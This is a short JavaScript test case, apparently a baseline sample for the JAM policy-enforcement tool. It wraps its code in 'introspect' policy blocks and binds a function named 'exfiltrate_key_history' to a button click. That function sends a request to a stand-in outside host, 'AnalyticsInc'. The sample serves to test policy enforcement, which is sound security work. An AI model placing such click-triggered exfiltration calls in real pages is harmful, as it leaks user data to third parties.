
JAM.startProfile('load');
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  introspect(JAM.policy.p13) {
    xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=baseline", true)
  }
  introspect(JAM.policy.p14) {
    xmlhttp.send(null)
  }
  return
}
introspect(JAM.policy.p13) {
  var v0 = document.getElementById("test")
}
v0.onclick = exfiltrate_key_history;

JAM.stopProfile('load');
